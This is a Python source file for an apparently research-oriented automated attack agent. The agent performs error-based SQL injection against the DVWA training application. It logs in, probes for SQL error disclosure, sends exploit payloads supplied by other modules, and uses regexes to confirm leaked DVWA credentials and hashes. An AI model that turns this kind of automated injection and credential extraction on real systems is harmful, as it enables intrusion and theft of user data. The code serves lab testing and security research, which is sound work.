"""SQLi Error-based injection agent with real HTTP execution."""

from __future__ import annotations

import logging
from typing import Any

from agents.agent_telemetry import exploit_event, probe_event, score_event
from foundation.http_client import http_accounted, request_scope
from agents.state_utils import (
    agent_visit_gate,
    candidate_payloads_for_stage,
    chain_check as _chain_check,
    graph_visit,
    make_update,
    merge_probe_observations,
    normalize_security_level,
    previously_executed_exploit_payloads,
    probe_outcome_update,
    probe_stage_blocked_update,
    resolve_stage_control_payloads,
    visit_block_update,
)
from foundation.control_catalog import quarantine_update
from core.state import ExploitationState, MODULE_TO_KG_NODE
from foundation.payload_library import PayloadLibrary
from foundation.session_manager import DVWASession, session_fingerprint
from foundation.verifier import Verifier

logger = logging.getLogger(__name__)

AGENT_ID = "sqli_error"
MODULE_PATH = "/vulnerabilities/sqli/"
SESSION_INPUT_PATH = "/vulnerabilities/sqli/session-input.php"
HIGH_RESULT_PATH = "/vulnerabilities/sqli/"
_PROBE_OBSERVATION_KEY = "error_messages_enabled"

# MySQL/DVWA error patterns that confirm SQL error injection is possible
_ERROR_SIGNALS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "supplied argument is not a valid mysql",
    "mysql_fetch",
    "sql syntax",
]

# Signals indicating successful data extraction via error-based methods.
# The response should show the DVWA/XPath error envelope together with
# extracted credential-like content, not generic page content.
_EXPLOIT_PATTERNS = [
    r"^\s*<pre>\s*duplicate entry ['\"]dvwa[01]['\"] for key ['\"]group_key['\"]\s*</pre>\s*$",
    r"xpath\s+(?:syntax\s+)?error\s*:\s*['\"]?~[a-z0-9_]+",
    r"~dvwa\b",
    r"surname\s*:\s*(?:admin|gordonb|pablo|smithy|1337):[a-f0-9]{32}\b",
]


def _request_high_via_session(session: DVWASession, payload: str):
    """Store a high-level payload, then reload the page that renders results."""
    submitted = session.post(SESSION_INPUT_PATH, data={"id": payload})
    if submitted.status_code != 200:
        return submitted
    return session.get(HIGH_RESULT_PATH)


def _request(session: DVWASession, security_level: str, payload: str):
    """Submit a SQLi form using the method exposed by the DVWA level."""
    request_data = {"id": payload, "Submit": "Submit"}
    if security_level == "medium":
        return session.post(MODULE_PATH, data=request_data)
    if security_level == "high":
        return _request_high_via_session(session, payload)
    return session.get(MODULE_PATH, params=request_data)


@http_accounted(role="detection_control", method=AGENT_ID)
def _probe_preconditions(
    session: DVWASession,
    payloads: list[str],
    already_tried: set[str],
    security_level: str = "low",
) -> tuple[bool, list[str], dict[str, bool], list[dict], bool]:
    """Send syntax-breaking probes to detect error message output.

    Returns (precondition_met, tried_payloads, observations, telemetry_events,
    all_responses_ok). A clean HTTP 200 without a recognized SQL error signal
    permits trying validated exploit candidates, but does not satisfy the
    error-disclosure precondition or contribute a score.
    """
    observations: dict[str, bool] = {}
    tried: list[str] = []
    events: list[dict] = []
    verifier = Verifier()
    sent_any = False
    all_responses_ok = True

    for payload in payloads:
        if payload in already_tried:
            continue
        sent_any = True
        tried.append(payload)
        try:
            resp = _request(session, security_level, payload)
            events.append(probe_event(AGENT_ID, payload, resp.status_code, False, response=resp))
            if resp.status_code != 200:
                all_responses_ok = False
            result = verifier.contains_any(resp.text, _ERROR_SIGNALS)
            if resp.status_code == 200 and result.ok:
                events[-1]["payload"].update(signal_detected=True, verified_grade=1, verification_reason="probe_signal")
                observations[_PROBE_OBSERVATION_KEY] = True
                return True, tried, observations, events, all_responses_ok
        except Exception as exc:
            logger.warning("[%s] PROBE request failed: %s", AGENT_ID, exc)
            events.append(probe_event(AGENT_ID, payload, None, False))
            all_responses_ok = False

    if not sent_any:
        # Don't overwrite prior observation if we didn't send any requests
        return False, tried, {}, events, False
    observations[_PROBE_OBSERVATION_KEY] = False
    return False, tried, observations, events, all_responses_ok


@http_accounted(phase="method", role="candidate", method=AGENT_ID)
def _attempt_exploit(
    session: DVWASession,
    payloads: list[str],
    already_tried: set[str],
    security_level: str = "low",
) -> tuple[int, list[str], list[str], list[dict]]:
    """Try error-based exploit payloads. Returns (score, tried, confirmed_vulns, events)."""
    tried: list[str] = []
    events: list[dict] = []
    confirmed: list[str] = []
    score = 0
    verifier = Verifier()

    for payload in payloads:
        if payload in already_tried:
            continue
        tried.append(payload)
        candidate_id = getattr(payload, "candidate_id", None)
        try:
            # A candidate-bound benign baseline distinguishes a candidate's own
            # error signal from generic page noise (level-1 early evidence).
            from hashlib import sha256 as _sha256
            with request_scope(role="candidate_verification"):
                baseline = _request(session, security_level, "1")
            baseline_sha = _sha256(str(getattr(baseline, "text", "")).encode()).hexdigest()
            baseline_control_id = f"control:{candidate_id}:baseline" if candidate_id else None
            events.append(probe_event(
                AGENT_ID, "1", getattr(baseline, "status_code", None), False,
                response=baseline, control_id=baseline_control_id,
                source_candidate_id=candidate_id,
                validation_relation="candidate_baseline" if candidate_id else None))
            resp = _request(session, security_level, payload)
            events.append(exploit_event(AGENT_ID, payload, resp.status_code, True, response=resp))
            if resp.status_code == 200:
                # Keep truncated XPath data, but reject bare tildes and prose.
                result = verifier.regex_match(resp.text, _EXPLOIT_PATTERNS)
                if result.ok:
                    events[-1]["payload"].update(verified_grade=3, verification_reason="verified_error_extraction")
                    score = max(score, 3)
                    confirmed.append(MODULE_TO_KG_NODE[AGENT_ID])
                    break
                if verifier.contains_any(resp.text, _ERROR_SIGNALS).ok:
                    error_in_baseline = verifier.contains_any(
                        getattr(baseline, "text", ""), _ERROR_SIGNALS).ok
                    if not error_in_baseline:
                        events[-1]["payload"].update(
                            signal_detected=True, verified_grade=1,
                            verification_reason="candidate_error_signal",
                            baseline_elapsed_ms=None,
                            baseline_response_sha256=baseline_sha,
                            baseline_control_id=baseline_control_id)
                        score = max(score, 1)
        except Exception as exc:
            logger.warning("[%s] EXPLOIT request failed: %s", AGENT_ID, exc)
            events.append(exploit_event(AGENT_ID, payload, None, False))

    return score, tried, confirmed, events

def sqli_error_agent(state: ExploitationState) -> dict[str, Any]:
    """Execute the SQL injection error-based static method agent.

    Reads validated candidates, DVWA target/session configuration, existing
    observations, and tried payload memory. The agent probes for database error
    disclosure, attempts error-leak payloads through HTTP, records telemetry,
    confirms `sqli_error_confirmed` when evidence is present, and delegates
    chain scoring to shared state utilities.

    Args:
        state: Current shared LangGraph state.

    Returns:
        Partial state update for observations, tried payloads, scores,
        confirmed vulnerabilities, achieved outcomes, and telemetry events.
    """
    target_url = state.get("target_url", "")
    security_level = normalize_security_level(state.get("security_level"))

    if not target_url:
        return make_update(state=state, module_name=AGENT_ID, score=0, tried_payloads=[])
    visit_gate = agent_visit_gate(state, AGENT_ID)
    if not visit_gate["allow"]:
        return visit_block_update(state, AGENT_ID, stop=visit_gate["stop"], gate=visit_gate["gate"])

    session = DVWASession(target_url)
    try:
        if not session.login():
            return make_update(
                state=state, module_name=AGENT_ID, score=0, tried_payloads=[],
                failure_agents=[AGENT_ID],
                execution_failure_code="SESSION_LOGIN_FAILED",
            )
        session.set_security_level(security_level)

        confirmed_vulns: list[str] = []
        achieved_outcomes: list[str] = []
        score = 0
        telemetry_events: list[dict[str, Any]] = []
        all_tried: list[str] = []
        observations: dict[str, bool] = {}

        # Stage 1: PROBE (frozen detection controls only)
        probe_payloads = candidate_payloads_for_stage(state, AGENT_ID, security_level, "probe")
        principal_id = getattr(session, "_principal_id", None) or getattr(session, "_username", None)
        probe_payloads = resolve_stage_control_payloads(state, AGENT_ID, probe_payloads, principal_id)
        if graph_visit(state, AGENT_ID) and not probe_payloads:
            return probe_stage_blocked_update(state, AGENT_ID)
        probe_ok, tried, probe_obs, probe_events, probe_responses_ok = _probe_preconditions(
            session, probe_payloads, set(), security_level
        )
        all_tried.extend(tried)
        telemetry_events.extend(probe_events)
        observations.update(probe_obs)
        probe_update, quarantine = probe_outcome_update(
            state, AGENT_ID, observations, probe_events, principal_id=principal_id,
            session_fingerprint=session_fingerprint(session))
        if quarantine:
            blocked = quarantine_update(
                state, method=AGENT_ID, visit_id=state.get("selected_visit_id"),
                control_id=f"{AGENT_ID}:probe:control", control_class="detection",
                reason=quarantine, detail="detection control exceeded its evidence role",
                evidence_refs=[f"control:{AGENT_ID}"],
                snapshot=probe_update.get("probe_controls", {}).get(AGENT_ID))
            blocked.update(visit_block_update(
                state, AGENT_ID, stop="quarantine",
                gate={"reason": quarantine, "evidence_refs": []}))
            blocked["telemetry_events"] = [*telemetry_events, *blocked.get("telemetry_events", [])]
            return blocked
        probe_status = (probe_update.get("precondition_status") or {}).get(_PROBE_OBSERVATION_KEY)
        if probe_status != "true":
            # A clean 200 without measured error disclosure is unknown, never
            # permission to run an exploit on an unproved prerequisite.
            update = make_update(
                state=state, module_name=AGENT_ID, score=0,
                tried_payloads=all_tried, telemetry_events=telemetry_events,
                default_candidate_stop_reason=(
                    "precondition_false" if probe_status == "false" else "precondition_unknown"),
            )
            update.update(probe_update)
            return update

        score = max(score, 1)

        # Stage 2: EXPLOIT (own current-visit candidate requests only)
        all_exploit = candidate_payloads_for_stage(state, AGENT_ID, security_level, "exploit")
        exploit_done = previously_executed_exploit_payloads(
            state, AGENT_ID, state.get("selected_visit_id"))

        exploit_score, tried, confirmed, exploit_events = _attempt_exploit(
            session, all_exploit, exploit_done, security_level
        )
        all_tried.extend(tried)
        telemetry_events.extend(exploit_events)
        score = max(score, exploit_score)
        confirmed_vulns.extend(confirmed)

        # Stage 3: CHAIN CHECK
        if confirmed_vulns:
            chain_score, chain_achieved = _chain_check(confirmed_vulns[0], state)
            if chain_score >= 4:
                score = max(score, chain_score)
                achieved_outcomes.extend(chain_achieved)

        telemetry_events.append(score_event(AGENT_ID, score, confirmed_vulns, achieved_outcomes))

        update = make_update(
            state=state, module_name=AGENT_ID, score=score,
            tried_payloads=all_tried,
            confirmed_vulns=confirmed_vulns or None,
            achieved_outcomes=achieved_outcomes or None,
            telemetry_events=telemetry_events,
        )
        merge_probe_observations(update, probe_update, state, observations)
        return update
    except Exception as exc:
        logger.warning("[%s] Session or execution failed: %s", AGENT_ID, exc)
        return make_update(
            state=state, module_name=AGENT_ID, score=0, tried_payloads=[],
            failure_agents=[AGENT_ID],
            execution_error=exc,
        )
    finally:
        session.close()
